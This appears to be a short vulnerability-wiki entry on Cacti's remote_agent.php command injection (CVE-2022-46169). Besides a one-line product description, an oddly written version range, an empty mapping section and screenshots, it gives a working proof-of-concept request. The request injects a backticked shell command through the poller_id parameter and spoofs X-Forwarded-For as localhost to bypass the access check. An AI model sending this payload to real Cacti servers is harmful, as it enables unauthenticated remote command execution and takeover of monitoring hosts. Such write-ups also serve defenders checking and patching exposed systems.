# Cacti remote_agent.php remote command execution vulnerability CVE-2022-46169

## Vulnerability Description

Cacti is a server monitoring and management platform. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Cacti < 1.2.17-1.2.22</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671182791178-ea22a02a-7451-4ad6-b9fb-03dcc3a17651.png)

Verify POC

```python
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`id>1.txt`
X-Forwarded-For: 127.0.0.1
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671183300849-373782ab-7b1d-4166-88a7-34657bfb6025.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1671183331943-89eccd02-cf00-478f-8093-173a5c14bd47.png)